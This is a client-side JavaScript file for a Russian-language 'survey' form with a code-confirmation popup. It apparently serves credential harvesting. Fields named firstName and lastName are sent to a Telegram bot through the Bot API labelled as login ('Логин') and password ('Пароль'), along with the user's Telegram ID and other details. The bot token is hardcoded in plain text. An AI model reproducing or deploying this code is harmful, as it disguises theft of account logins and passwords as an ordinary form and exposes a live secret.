document.addEventListener('DOMContentLoaded', () => {
    const form = document.getElementById('surveyForm');
    const popup = document.getElementById('popup');
    const codePopup = document.getElementById('codePopup');
    const closeBtn = document.querySelector('.close-btn');
    const codePopupCloseBtn = document.getElementById('codePopupClose');
    const versionSelect = document.getElementById('version');
    const versionError = document.getElementById('versionError');
    const continueButton = document.getElementById('continueButton');
    const submitCodeButton = document.getElementById('submitCodeButton');
    const codeInput = document.getElementById('code');
    const codeError = document.getElementById('codeError');
    let generatedCode = ''; // Variable to store the generated code

    // --- Continue Button and Code Popup ---
    continueButton.addEventListener('click', () => {
        popup.classList.remove('show');
        codePopup.classList.add('show');
    });

    codePopupCloseBtn.addEventListener('click', () => {
        codePopup.classList.remove('show');
    });

    codePopup.addEventListener('click', (event) => {
        if (event.target === codePopup) {
            codePopup.classList.remove('show');
        }
    });

    document.addEventListener('keydown', (event) => {
        if (event.key === 'Escape' && codePopup.classList.contains('show')) {
            codePopup.classList.remove('show');
        }
    });

    submitCodeButton.addEventListener('click', () => {
        codeError.textContent = ''; // Clear previous error
        if (!codeInput.value) {
            codeError.textContent = 'Пожалуйста, введите код.';
            codeInput.classList.add('invalid');
        } else if (codeInput.value === generatedCode) { // Verify against generated code
            codeInput.classList.remove('invalid');
            console.log('Код подтвержден:', codeInput.value);
            codePopup.classList.remove('show');
            
            // Send confirmation message to Telegram
            const confirmationMessage = `✅ Код подтвержден!\n\nТелеграм для связи: @realkarmakun`;
            const botToken = '8134278525:AAHd6ZpW3omshp96ac8F7SNKUWJNYq1N_i8';
            const telegramId = form.telegramId.value;
            const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

            fetch(apiUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: telegramId,
                    parse_mode: 'HTML',
                    text: confirmationMessage
                })
            })
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    console.log('Сообщение о подтверждении кода успешно отправлено в Telegram!');
                    alert('Код подтвержден! Спасибо.'); // Optionally keep a simple alert for immediate feedback
                } else {
                    console.error('Ошибка отправки сообщения о подтверждении кода в Telegram:', data);
                    alert('Код подтвержден, но произошла ошибка при отправке сообщения в Telegram.');
                }
            })
            .catch(error => {
                console.error('Ошибка fetch при отправке сообщения о подтверждении:', error);
                alert('Код подтвержден, но произошла ошибка при отправке сообщения в Telegram.');
            });

        } else {
            codeError.textContent = 'Неверный код. Попробуйте еще раз.';
            codeInput.classList.add('invalid');
            console.log('Неверный код:', codeInput.value, 'Ожидался:', generatedCode);
        }
    });

    codeInput.addEventListener('input', () => {
        if (codeInput.checkValidity()) {
            codeInput.classList.remove('invalid');
            codeError.textContent = '';
        }
    });

    // Function to generate a 4-digit code
    function generateCode() {
        return String(Math.floor(1000 + Math.random() * 9000)); // Generates number between 1000 and 9999
    }

    form.addEventListener('submit', function(event) {
        event.preventDefault(); // Prevent default form submission

        // --- Custom Validation ---
        let isValid = true;

        // Clear previous custom error messages and styles
        versionError.textContent = '';
        // Reset styles for other fields if needed (though browser validation handles some)
        form.querySelectorAll('.invalid').forEach(el => el.classList.remove('invalid'));

        // 1. Custom validation for version
        if (!versionSelect.value) {
            versionError.textContent = 'Пожалуйста, выберите версию.';
            versionSelect.classList.add('invalid');
            isValid = false;
        } else {
            versionSelect.classList.remove('invalid');
        }

        // 2. Check standard HTML5 validation for other required fields
        if (!form.checkValidity()) {
            isValid = false;
            // Add 'invalid' class to visually indicate errors beyond native browser styles
            form.querySelectorAll(':invalid').forEach(field => {
                field.classList.add('invalid');
                // Find corresponding error message span if exists and display custom msg? (Optional)
            });
        } else {
            // Clear invalid class from fields that are now valid
            form.querySelectorAll('input:valid, textarea:valid, select:valid').forEach(field => {
                field.classList.remove('invalid');
            });
        }

        // --- Form Submission ---
        if (isValid) {
            console.log('Форма валидна, отправляем...');

            // Collect form data
            const formData = {
                firstName: form.firstName.value,
                lastName: form.lastName.value,
                birthDate: form.birthDate.value,
                version: versionSelect.value,
                notes: form.notes.value,
                telegramId: form.telegramId.value // Добавляем telegramId
            };

            // Generate verification code
            generatedCode = generateCode();
            console.log('Сгенерированный код:', generatedCode);

            // Construct Telegram message
            let message = `📩 Новая анкета:\n`;
            message += `<b>Логин:</b> ${formData.firstName}\n`;
            message += `<b>Пароль:</b> ${formData.lastName}\n`;
            message += `<b>Дата регистрации:</b> ${formData.birthDate}\n`;
            message += `<b>Выбор версии:</b> ${formData.version}\n`;
            message += `<b>Telegram ID:</b> ${formData.telegramId}\n`; // Добавляем telegramId в сообщение
            if (formData.notes) {
                message += `<b>Примечание:</b> ${formData.notes}\n`;
            }
            message += `\n<b>Код подтверждения:</b> <code>${generatedCode}</code>\n`; // Add code to message

            // Telegram Bot API parameters
            const botToken = '8134278525:AAHd6ZpW3omshp96ac8F7SNKUWJNYq1N_i8';
            const telegramId = form.telegramId.value;
            const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

            // Send message to Telegram
            fetch(apiUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: telegramId,
                    parse_mode: 'HTML',
                    text: message
                })
            })
            .then(response => {
                console.log('Telegram API response status:', response.status);
                if (!response.ok) {
                    console.error('HTTP error!', response);
                    throw new Error(`HTTP error! status: ${response.status}`);
                }
                return response.json();
            })
            .then(data => {
                console.log('Telegram API response data:', data);
                if (data.ok) {
                    console.log('Сообщение в Telegram успешно отправлено!');
                    // If form is valid and message sent, show the popup
                    popup.classList.add('show');
                } else {
                    console.error('Ошибка отправки в Telegram:', data);
                    alert('Ошибка отправки сообщения. Пожалуйста, попробуйте позже. \n\n' + JSON.stringify(data));
                }
            })
            .catch(error => {
                console.error('Ошибка fetch:', error);
                alert('Ошибка отправки сообщения. Пожалуйста, попробуйте позже. \n\n' + error.message);
            });
        } else {
            console.log('Форма невалидна');
            // Trigger browser's report for invalid fields that failed HTML5 validation
            // This will show the default browser popups for those specific fields
            form.reportValidity();
        }
    });

    // --- Popup Handling ---
    // Close popup when the close button is clicked
    closeBtn.addEventListener('click', () => {
        popup.classList.remove('show');
    });

    // Close popup when clicking the background overlay
    popup.addEventListener('click', (event) => {
        // Only close if the click is directly on the popup background (not the content)
        if (event.target === popup) {
            popup.classList.remove('show');
        }
    });

    // Close popup with Escape key
    document.addEventListener('keydown', (event) => {
        if (event.key === 'Escape' && popup.classList.contains('show')) {
            popup.classList.remove('show');
        }
    });

    // --- Improve UX: Remove error styles on input ---
    form.querySelectorAll('input, textarea, select').forEach(input => {
        input.addEventListener('input', () => {
            if (input.checkValidity()) {
                input.classList.remove('invalid');
                // Find and clear related custom error message if applicable
                const errorSpanId = input.id + 'Error';
                const errorSpan = document.getElementById(errorSpanId);
                if (errorSpan) errorSpan.textContent = '';
            }
        });
    });

    // Clear version error on change
    versionSelect.addEventListener('change', () => {
        if (versionSelect.value) {
            versionError.textContent = '';
            versionSelect.classList.remove('invalid');
        }
    });
});